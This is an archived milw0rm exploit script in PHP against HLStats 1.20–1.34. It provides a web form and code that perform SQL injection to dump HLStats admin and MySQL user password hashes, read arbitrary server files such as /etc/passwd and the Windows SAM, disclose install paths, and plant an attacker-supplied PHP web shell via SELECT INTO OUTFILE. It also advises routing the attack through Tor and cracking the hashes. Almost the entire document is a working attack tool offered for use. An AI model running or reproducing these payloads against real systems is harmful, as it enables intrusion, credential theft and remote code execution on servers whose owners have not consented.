<br><b>
<?php
/*
Live Exploit Code
SQL Inection + Path Disclosure
Affects HLStats HLStats <=1.34  and Hlstats >= 1.20
works with magic_quotes_gpc=On
by Michael Brooks
*/

 print "<title>HLStats SQL Injection Exploit</title>
 <body bgcolor='#009900'>
 <font  color='#FF0000'>
<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>
<center><b> <br>
Welcome To HLstats Exploit code.<br><br>
</b></center> 
<br> 
SQL Inection + Path Disclosure<br>
Affects Hlstats >= 1.20 to HLStats <=1.34(current)<br>
Tested on Linux and Windows<br>
works with magic_quotes_gpc=On!<br>
HLStats has gone though 5 years with no exploits so this is a Birthday Present!<br>
Merry Christmass!<br>
By Michael Brooks<br>
<br>
<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>
";
 
 print "
 	<form action='".$_SERVER['PHP_SELF']."' method='post'>
	<b>Target:</b><br>
	<input type='text' name='target' size=32><br>
	(hint: where the login form is. example: http://domain.com/path/hlstats.php )<br>
	<br><b>Proxy:</b>(ip:port or name:pass@ip:port)<br>
	<input type='text' name='proxy' size=32><br>
	(example: 127.0.0.1:8118   Use <a href='http://tor.eff.org'>Tor</a>+<a href='http://www.privoxy.org/'>Privoxy</a>. )<br>
	<br><br>
	If nothing is changed below this line then the exploit will attempt to get the database login information in plain text.
<b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br><br>
	<H1>ATTACKS:</H1>
	<br>
	<b>Database Selects:</b><br>
	<br>
	OBTIAN HLStats logins:<br>
	<input type='submit' name='button' value='HLStats_Logins'>(Passwords are stored as MD5 hashs, use: <a href='http://www.milw0rm.com/cracker/insert.php'>Milw0rm's MD5 Cracker</a>)<br>
 		
 		  OBTIAN mysql.user logins:<br>
 		<input type='submit' name='button' value='Mysql_Logins'><br>
	<br>

	<br>
 	<b>File IO:</b><br><br>
 	<b>Path Disclosure</b><br>
 	<input type='submit' name='button' value='Path'><br>
	<br>
	<b>Plain Text Database Login Information</b><br>
	<input type='submit' name='button' value='Read_Login'>
	(This will attempt to read the configuration file for hlstats and dump the PLAIN TEXT database login information.)<br>
	<br>
	<b>Read Other File</b><br>
	<input type='submit' name='button' value='Read_File'>
	<input type='text' name='read_file' size=50>
	<br>example: /etc/passwd<br>
	OR for windows based systems: C:\\\\WINDOWS\\\\repair\\\\sam<br>
	<br><b>attempt payload:</b>(WARNING,  NO PROXY IS USED FOR UPLOADING PAYLOAD)<br>
	<input type='submit'  name='button' value='Upload'>
	 &lt?php <input type='text' name='payload' size=50>?&gt <br>
	example: system('netstat'); <br>
	
	</form>
	<br><b>--------------------------------------------------------------------------------------------------------------------------------------------></b><br>
	";

 //generic http class
class http{
	var $proxy_ip='', $proxy_port='', $proxy_name='', $proxy_pass='';
	
	function http_gpc_send($loc ,$cookie="", $postdata = "") { 
		 //overload function polymorphism between gets and posts
		 $url=parse_url($loc);
		 if(!isset($url['port'])){
		   $url['port']=80;
		}
		//$ua=$_SERVER['HTTP_USER_AGENT'];
		$ua='GPC/.01';
		 if($this->proxy_ip!=''&&$this->proxy_port!=''){
			$fp = pfsockopen( $this->proxy_ip, $this->proxy_port, &$errno, &$errstr, 120 );
			$url['path']=$url['host'].':'.$url['port'].$url['path'];
		 }else{
			$fp = fsockopen( $url['host'], $url['port'], &$errno, &$errstr, 120 );
		 }
		 
		 if( !$fp ) {
		    print "$errstr ($errno)<br>\nn";
		 } else {
		    if( $postdata=='' ) {
			fputs( $fp, "GET ".$url['path']."?".$url['query']." HTTP/1.1\r\n" );
		    } else {
			fputs( $fp, "POST ".$url['path']."?".$url['query']." HTTP/1.1\r\n" );
		    }
		    
		    if($this->proxy_name!=''&&$this->proxy_pass!=''){
			fputs($fp, "Proxy-Authorization: Basic ".base64_encode($this->proxy_name.":".$this->proxy_pass)."\r\n\r\n");
		    }

		    fputs($fp, "Host: ".$url['host'].":".$url['port']."\r\n");
		    fputs( $fp, "User-Agent: ".$ua."\r\n" );
		    fputs( $fp, "Accept: text/plain\r\n" );
		    fputs( $fp,"Connection: Close\r\n" );
		    if($cookie!=''){ 
			fputs( $fp, "Cookie: ".$cookie."\r\n" );
		    }
		    if( $postdata!='' ) {
			$strlength = strlen( $postdata );
			fputs( $fp, "Content-type: application/x-www-form-urlencoded\r\n" );
			fputs( $fp, "Content-length: ".$strlength."\r\n\r\n" );
			fputs( $fp, $postdata);
		    }
		    fputs( $fp, "\n\n" );
		    
		   $output = "";
		   while( !feof( $fp ) ) {
			$output .= fgets( $fp, 1024 );
		   }
		    fclose( $fp );
		 }
		 return $output;
	}
	
	function proxy($proxy){ //user:pass@ip:port
		$proxyAuth=explode('@',$proxy);
		if(isset($proxyAuth[1])){
			$login=explode(':',$proxyAuth[0]);
			$this->proxy_name=$login[0];
			$this->proxy_pass=$login[1];
			
			$addr=explode(':',$proxyAuth[1]);
			$this->proxy_ip=$addr[0];
			$this->proxy_port=$addr[1];
		}else{
			$addr=explode(':',$proxy);
			$this->proxy_ip=$addr[0];
			$this->proxy_port=$addr[1];
		}
	}
	
	function get($url, $cookie=''){
		return $this->http_gpc_send($url, $cookie);
	}

	function post($url, $cookie='', $post=''){
		return $this->http_gpc_send($url,$cookie,$post);
	}
	
	function getServer($url){
		$resp=$this->http_gpc_send($url);
		$header=explode("Server: ",$resp);
		$server=explode("\n",$header[1]);
		return $server[0];
	}
}

//reuseable functions
function getPath($html){
	$path='';
	$resp=explode("array given in <b>",$html);
	if(isset($resp[1])){
		$resp = explode("</b>",$resp[1]);
	}else{
		$resp[0]=false;
	}
	return $resp[0];
}

function charEncode($string){
	$char="char(";
	$size=strlen($string);
	for($x=0;$x<$size;$x++){
		$char.=ord($string[$x]).", ";
	}
	$char[strlen($char)-2]=')%00';
	return $char;
}

function hex_encode($my_string)
{
$encoded="0x";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {$temp=dechex(ord($my_string[$k]));
    if (strlen($temp)==1) {$temp="0".$temp;}
    $encoded.=$temp;
  }
  return $encoded;
} 


//hlstats specific functions
function hl_get_sql($resp){
	//print htmlspecialchars($resp);
	$tmp=explode('<table ',$resp);
	array_pop($tmp);
	$last=array_pop($tmp);
	$tbl=explode('</table>',$last);
	$table=$tbl[0];//ITS MY TABLE NOW!
	if(strstr($table,'Victim')&&strstr($table,'Times Killed')){
		$table=str_replace('border=0','border=1',$table);
		$table=str_replace('#002E8A','#000000',$table);
		$table=str_replace('#15154D','#CCCCCC',$table);
		$table=str_replace('#161652','#CCCCCC',$table);
		$table='<table '.$table.'</table>';
	}else{
		$table=false;
	}
	return $table;
}

function get_logins($addr){
	$http=new http();
	$data='';
	$resp=$http->get($addr."?mode=playerinfo&player=1&playerdata[lastName][]=1");
	$path=getPath($resp);
	$readfile=hex_encode($path);
	$pay="killLimit=99999%20union%20select%20load_file($readfile),1,1,1,1%20--%20";
	$resp=$http->post($addr."?mode=playerinfo&player=1",'',$pay);
		
	$tmp=explode("define(&quot;DB_NAME&quot;, &quot;",$resp);
	$tmp=explode("&quot;",$tmp[1]);
	$data[db]=$tmp[0];

	$tmp=explode("define(&quot;DB_USER&quot;, &quot;",$resp);
	$tmp=explode("&quot;",$tmp[1]);
	$data[name]=$tmp[0];
	
	$tmp=explode("define(&quot;DB_PASS&quot;, &quot;",$resp);
	$tmp=explode("&quot;",$tmp[1]);
	$data[pass]=$tmp[0];
	
	$tmp=explode("define(&quot;DB_ADDR&quot;, &quot;",$resp);
	$tmp=explode("&quot;",$tmp[1]);
	$data[addr]=$tmp[0];
	
	$tmp=explode("define(&quot;DB_TYPE&quot;, &quot;",$resp);
	$tmp=explode("&quot;",$tmp[1]);
	$data[type]=$tmp[0];
	
	return $data;
}

//The table prefix is needed to union select the hlstats logins
function get_prefix($attack){
	$prefix=false;
	$http=new http();
	//hex_encode is used instead of quote marks
	$payload="killLimit=1000%20union%20select%20TABLE_NAME,TABLE_SCHEMA,1,1,1%20from%20information_schema.TABLES%20WHERE%20TABLE_NAME%20LIKE%20".hex_encode("%events_playerplayeractions")."%23";
	$resp=$http->post($attack."?mode=playerinfo&player=1",'',$payload);
	$mid=explode('events_playerplayeractions',$resp);
	if(is_array($mid)){
		foreach($mid as $m){
			$pre= explode('>',$m);
			$fix=array_pop($pre);
			if(is_array($prefix)){
				if(!in_array($fix,$prefix)){
					$prefix[]=trim($fix);
				}
			}else if($prefix!=$fix){
				print($fix);
				$prefix[]=trim($fix);
			}
		}
		if(is_array($prefix)){
			$v=array_pop($prefix);
			if(trim($v)!='0'){//damn that zero!!
				array_push($prefix,$v);
			}
		}
	}else{
		$prefix=false;
	}
	return($prefix);
}

if(isset($_REQUEST['target'])&&$_REQUEST['target']!=''){
	//this exploit can take its sweet time. 
	set_time_limit(0);
	$http=new http();
	$addr=explode('?',$_REQUEST['target']);
	$addr=$addr[0];
	if(isset($_REQUEST['proxy'])){
		$http->proxy($_REQUEST['proxy']);
	} 
	
	switch($_REQUEST['button']){
		case 'HLStats_Logins':
			$table=false;
			$prefix=get_prefix($addr);
			//print_r($prefix);
			foreach($prefix as $pre){
				if(!$table){
					print "trying table prefix:$pre<br>";
					//no comments are used in this payload,  instead a second union select is used to finnish the query.
					$pay="killLimit=1000%20union%20select%20username,password,acclevel,1,playerId%20from%20".$pre."Users%20UNION%20SELECT%201,1,1,1,1%20FROM%20".$pre."Players%20WHERE%201=0";
					$resp=$http->post($addr."?mode=playerinfo&player=1",'',$pay);
					$table=hl_get_sql($resp);//  
				}
			}
			if(!$table&&@!in_array('hlstats_',$prefix)){//ooah no the exploit has failed so far. 
					$pre="hlstats_";//try the default prefix
					print "trying table prefix:$pre<br>";
					$pay="killLimit=1000%20union%20select%20username,password,acclevel,1,playerId%20from%20".$pre."Users%20UNION%20SELECT%201,1,1,1,1%20FROM%20".$pre."Players%20WHERE%201=0";
					$resp=$http->post($addr."?mode=playerinfo&player=1",'',$pay);
					$table=hl_get_sql($resp);//  			
			}
			if($table){
				$table=str_replace('Victim','username',$table);
				$table=str_replace('Kills per Death','playerId',$table);
				$table=str_replace('Deaths by','acclevel',$table);
				$table=str_replace('Times Killed','password',$table);
				$table=str_replace('Rank','Count',$table);
				print "<br>$table";
			}
			break;
		case 'Mysql_Logins':
			//a comment is used so the table prefix doesn't have to be known;  this is simpler,  less to go wrong.  
			$pay="killLimit=1000%20union%20select%20user,password,File_priv,1,Host%20%20from%20mysql.user%20--%20";
			$resp=$http->post($addr."?mode=playerinfo&player=1",'',$pay);
			$table=hl_get_sql($resp);
			$table=str_replace('Victim','User',$table);
			$table=str_replace('Kills per Death','Host',$table);
			$table=str_replace('Deaths by','File_priv',$table);
			$table=str_replace('Times Killed','Password',$table);
			$table=str_replace('Rank','Count',$table);
			print "<br>$table";
		break;
		case 'Read_File':
			$readfile=hex_encode($_REQUEST[read_file]);
			$pay="killLimit=99999%20union%20select%20load_file($readfile),1,1,1,1%20--%20";
			$resp=$http->post($addr."?mode=playerinfo&player=1",'',$pay);			
			$tmp=explode('alt="player.gif"><b>',$resp);
			$data=explode("</font>",$tmp[1]);
			$data=$data[0];
			//this might be a bad thing:
			$data=preg_replace('<br />','',$data);
			print 'data'.$data; 		
		break;
		case 'Path':
			$resp=$http->get($addr."?mode=playerinfo&player=1&playerdata[lastName][]=1");
			$path=getPath($resp );
			print "Path Disclosure:$path<br>";
		break;	
		case 'Read_Login':
			$data=get_logins($addr);
			foreach($data as $var=>$val){
				   $tmp=explode('&quot',$val);
					$data[$var]=$tmp[0];
					print "<br>".$var.":".$tmp[0];
			}	
		break;
		case 'Upload':
			$resp=$http->get($addr."?mode=playerinfo&player=1&playerdata[lastName][]=1");
			$path=getPath($resp );
			$data=get_logins($addr);
			print $path."<br>";
			$tar=explode('/',$_REQUEST['target']);
			$paylink=$tar;
			array_pop($paylink);
			$paylink=implode('/',$paylink);
			if(strstr($path,':')){//if windows
				print "Windows Sytem<br>";
				$temp=explode('\\',$path);
			}else{//else *nix
				print "*nix System<br>";
				$temp=explode('/',$path);
			}
			array_pop($temp);
			$path=implode('/',$temp);
			mysql_connect($tar[2],$data[name],$data[pass]) or die(mysql_error());
			$name="data".rand();//rand is used so that this attack can be run multiple times.
			$sql="SELECT '<?php ".$_REQUEST[payload]."?>' INTO OUTFILE '$path/$name.php'";
			print "<br><a href='$paylink/$name.php'><b> Execute Payload </b></a>";
			mysql_query($sql) or die(mysql_error());
		break;
		default:
			print 'No Attack!';
		break;
	}
}else{
	Print "No Target.";
}
?><br>--------------------------------------------------------------------------------------------------------------------------------------------><br>

# milw0rm.com [2006-12-25]
